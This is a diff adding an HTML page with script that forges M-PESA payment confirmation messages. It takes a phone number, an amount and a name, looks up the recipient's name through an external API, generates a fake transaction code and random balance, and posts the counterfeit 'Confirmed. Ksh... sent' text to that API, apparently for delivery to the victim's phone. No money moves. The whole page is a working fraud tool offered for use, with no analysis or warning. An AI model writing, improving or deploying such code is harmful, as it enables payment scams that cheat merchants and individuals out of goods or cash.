@@ -1,0 +1,239 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+
+<style>
+* { box-sizing: border-box; }
+
+body { 
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; 
+  background: #121212; 
+  color: #e0e0e0; 
+  margin: 0; 
+  padding: 20px;
+  min-height: 100vh;
+}
+
+.container { 
+  max-width: 450px; 
+  background: #1e1e1e; 
+  margin: 0 auto; 
+  padding: 25px; 
+  border-radius: 12px; 
+  box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+}
+
+.step-label {
+  display: none;
+  margin-top: 15px;
+  font-weight: 600;
+  color: #b0b0b0;
+  text-align: center;
+}
+
+.step-label.active { display: block; }
+
+input, button { 
+  width: 100%; 
+  padding: 12px; 
+  margin-top: 8px; 
+  border: none; 
+  border-radius: 8px; 
+  font-size: 16px;
+  display: none;
+}
+
+input.active, button.active { display: block; }
+
+input { 
+  background: #2a2a2a; 
+  color: #fff; 
+  border: 1px solid #404040;
+}
+
+input::placeholder { color: #888; }
+
+input:focus {
+  outline: none;
+  border-color: #4caf50;
+  box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.2);
+}
+
+button { 
+  background: linear-gradient(135deg, #080808, #0d0e0d); 
+  color: white; 
+  font-weight: 600; 
+  cursor: pointer; 
+  transition: all 0.2s ease;
+}
+
+button:hover { 
+  background: linear-gradient(135deg, #0a0a0a, #388e3c);
+  transform: translateY(-1px);
+}
+
+button:active { transform: translateY(0); }
+
+pre { 
+  background: #252525; 
+  padding: 15px; 
+  border-radius: 8px; 
+  margin-top: 15px; 
+  white-space: pre-wrap; 
+  font-size: 14px;
+}
+
+@media (max-width: 480px) {
+  body { padding: 15px; }
+  .container { padding: 20px; margin: 10px auto; border-radius: 16px; }
+  input, button { padding: 14px; font-size: 17px; }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Step 1: Phone -->
+  <div class="step-label active" id="phoneLabel">Enter phone no.</div>
+  <input type="text" id="phone" class="active" placeholder="">
+  <button id="phoneOkBtn" class="active">OK</button>
+
+  <!-- Step 2: Amount -->
+  <div class="step-label" id="amountLabel">Enter Amount</div>
+  <input type="number" id="amount" placeholder="">
+  <button id="amountOkBtn">OK</button>
+
+  <!-- Step 3: Name -->
+  <div class="step-label" id="nameLabel">Enter Full Name</div>
+  <input type="text" id="name" placeholder="">
+  <button id="nameOkBtn">OK</button>
+
+  <!-- Step 4: Send -->
+  <button id="sendBtn">Send </button>
+
+  <!-- Output -->
+  <pre id="output"></pre>
+</div>
+
+<script>
+const API = "https://mpesab.vercel.app";
+
+const phone = document.getElementById("phone");
+const amount = document.getElementById("amount");
+const name = document.getElementById("name");
+const output = document.getElementById("output");
+
+const phoneOkBtn = document.getElementById("phoneOkBtn");
+const amountOkBtn = document.getElementById("amountOkBtn");
+const nameOkBtn = document.getElementById("nameOkBtn");
+const sendBtn = document.getElementById("sendBtn");
+
+function hideAll(){
+  document.querySelectorAll(".step-label").forEach(e=>e.classList.remove("active"));
+  document.querySelectorAll("input").forEach(e=>e.classList.remove("active"));
+  document.querySelectorAll("button").forEach(e=>e.classList.remove("active"));
+}
+
+function showPhone(){
+  hideAll();
+  phoneLabel.classList.add("active");
+  phone.classList.add("active");
+  phoneOkBtn.classList.add("active");
+}
+
+function showAmount(){
+  hideAll();
+  amountLabel.classList.add("active");
+  amount.classList.add("active");
+  amountOkBtn.classList.add("active");
+}
+
+function showName(){
+  hideAll();
+  nameLabel.classList.add("active");
+  name.classList.add("active");
+  nameOkBtn.classList.add("active");
+}
+
+function showSend(){
+  hideAll();
+  sendBtn.classList.add("active");
+}
+
+function cost(a){
+  if(a<=100) return 0;
+  if(a<=500) return 0;
+  if(a<=1000) return 0;
+  if(a<=20000) return 0;
+  if(a<=35000) return 0;
+  if(a<=50000) return 0;
+  return 0;
+}
+
+function token(){
+  return "UAH" + Math.random().toString(36).substring(2,9).toUpperCase();
+}
+
+function dt(){
+  const d=new Date();
+  return `${d.getDate()}/${d.getMonth()+1}/${String(d.getFullYear()).slice(-2)} at `
+       + d.toLocaleTimeString([], {hour:'numeric',minute:'2-digit'});
+}
+
+/* ===== FLOW ===== */
+showPhone();
+
+phoneOkBtn.onclick = async ()=>{
+  if(!phone.value.trim()) return alert("Enter phone number");
+  try{
+    const r = await fetch(`${API}/lookup/${phone.value}`);
+    const d = await r.json();
+    if(d.found) name.value = d.name;
+  }catch{}
+  showAmount();
+};
+
+amountOkBtn.onclick = ()=>{
+  if(amount.value <= 0) return alert("Invalid amount");
+  showName();
+};
+
+nameOkBtn.onclick = ()=>{
+  if(!name.value.trim()) return alert("Enter full name");
+  showSend();
+};
+
+sendBtn.onclick = async ()=>{
+  const a = +amount.value;
+  const c = cost(a);
+  const t = token();
+
+  const msg =
+`${t} Confirmed. Ksh${a.toFixed(2)} sent to ${name.value} on ${dt()}. New Mpesa balance is Ksh${(Math.random()*5000+100).toFixed(2)}.Transaction cost, Ksh${c.toFixed(2)}.Amount you can transact within the day is 499,960.00.Save frequent paybills for quick payment on M-PESA app https://m-pesaforbusiness.co.ke`;
+
+  output.textContent = msg;
+
+  try{
+    await fetch(`${API}/send`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        phone: phone.value,
+        name: name.value,
+        amount: a,
+        cost: c,
+        message: msg,
+        token: t
+      })
+    });
+  }catch{}
+
+  showPhone();
+};
+</script>
+
+</body>
+</html>
